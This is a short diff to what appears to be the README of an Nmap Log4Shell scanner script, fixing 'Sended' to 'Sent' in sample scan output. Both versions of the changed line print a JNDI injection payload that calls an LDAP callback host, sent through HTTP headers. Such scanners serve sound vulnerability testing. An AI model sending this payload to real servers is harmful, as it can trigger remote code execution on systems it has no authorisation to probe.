@@ -31,7 +31,7 @@ Copy the provided script (log4shell.nse) into that directory run `nmap --script-
     PORT     STATE SERVICE
     8080/tcp open  http-proxy
     | log4shell: 
-    |   (!) Sended payload ${jndi:ldap://172.17.42.1:1389/log4shell/127.0.0.1/8080} using HTTP headers:
+    |   (!) Sent payload ${jndi:ldap://172.17.42.1:1389/log4shell/127.0.0.1/8080} using HTTP headers:
     |   
     |    - X-Api-Version (200)
     |    - User-Agent (200)
